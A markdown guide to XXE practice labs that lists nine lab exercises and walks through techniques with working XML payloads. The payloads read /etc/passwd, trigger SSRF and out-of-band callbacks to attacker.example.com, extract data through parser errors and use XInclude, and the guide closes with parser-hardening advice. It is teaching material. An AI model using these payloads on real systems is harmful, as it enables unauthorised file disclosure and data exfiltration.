# XXE Labs

## XXE Practice Labs Catalog

This lab collection mirrors the PortSwigger XXE lab structure and is designed to help you practice the key XXE techniques.

### Apprentice

1. **Exploiting XXE to retrieve files**
   - Goal: find an XML endpoint and use an external entity to retrieve a server-side file.
   - Core skills: `DOCTYPE` declaration, external entity insertion, response analysis.

2. **Exploiting XXE to perform SSRF attacks**
   - Goal: use an external entity to trigger a back-end HTTP request from the server.
   - Core skills: SSRF payload construction, attacker-controlled callback domains, blind and reflected SSRF.

### Practitioner

3. **Blind XXE with out-of-band interaction**
   - Goal: detect blind XXE by causing the server to make a request to a controlled out-of-band hostname.
   - Core skills: OAST detection, attacker callback monitoring, blind XXE payloads.

4. **Blind XXE with out-of-band interaction via XML parameter entities**
   - Goal: use XML parameter entities when regular entity-based payloads are filtered.
   - Core skills: DTD parameter entity syntax, `%entity;` usage, external DTD interaction.

5. **Exploiting blind XXE to exfiltrate data using a malicious external DTD**
   - Goal: build a malicious DTD that reads file contents and sends them to an attacker-controlled server.
   - Core skills: dynamic entity declaration, out-of-band data exfiltration, remote DTD hosting.

6. **Exploiting blind XXE to retrieve data via error messages**
   - Goal: force an XML parsing error that leaks sensitive data inside the error message.
   - Core skills: error-based XXE, invalid file references, parser error content.

7. **Exploiting XInclude to retrieve files**
   - Goal: use XInclude when the attacker cannot control the full XML document or DTD.
   - Core skills: XInclude namespace, `xi:include` syntax, hidden XML attack surface.

8. **Exploiting XXE via image file upload**
   - Goal: exploit XML-based file uploads such as SVG or XML metadata.
   - Core skills: file upload analysis, XML file crafting, alternate attack vectors.

### Expert

9. **Exploiting XXE to retrieve data by repurposing a local DTD**
   - Goal: locate an existing DTD file on the server and reuse it to trigger blind XXE error extraction.
   - Core skills: local DTD enumeration, hybrid DTD exploitation, advanced error-based XXE.

## Lab walkthrough guidance

### 1. Find the XML endpoint

- Inspect requests in the target application for XML content types such as `text/xml`, `application/xml`, or `application/soap+xml`.
- Check for endpoints that accept file uploads or receive XML-like payloads, even if the traffic is not obviously XML.
- Convert standard form submissions to XML where allowed, and resend the request with `Content-Type: text/xml`.

### 2. Inject an external entity

- Add a `DOCTYPE` block to the XML input.
- Declare an external entity using a local file path or remote URL.
- Insert the entity reference in a value that is returned by the application.

Example file-read payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo><bar>&xxe;</bar></foo>
```

Example SSRF payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.example.com/callback"> ]>
<foo><bar>&xxe;</bar></foo>
```

### 3. Test blind injection

- If the application does not reflect entity values, test for out-of-band callbacks.
- Use a collaborator server, DNS logger, or a controlled host to detect requests.
- When direct entity injection is blocked, switch to parameter entities or external DTD payloads.

Example parameter entity payload:

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.example.com/collab">
  %xxe;
]>
<foo>test</foo>
```

### 4. Abuse parser errors

- If OAST is blocked, use error-based extraction.
- Force the parser to read a nonexistent path that includes sensitive file contents.
- Look for parser error messages in the response.

Example error payload via external DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'file://nonexistent/%file;'>">
%eval;
%exfiltrate;
```

### 5. Use XInclude for hidden XML surfaces

- When you cannot define a `DOCTYPE`, test whether XInclude is supported.
- Insert a small XML fragment that references a local file.

Example:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 6. Harden server-side XML processing

- Configure parsers to disallow external entities and DTDs.
- Disable XInclude processing unless explicitly required.
- Use strict XML schema validation.
- Avoid parsing untrusted XML with default parser settings.

## Reference links

- XXE topic: https://portswigger.net/web-security/xxe
- XML entities: https://portswigger.net/web-security/xxe/xml-entities
- Blind XXE: https://portswigger.net/web-security/xxe/blind
- XXE labs: https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection
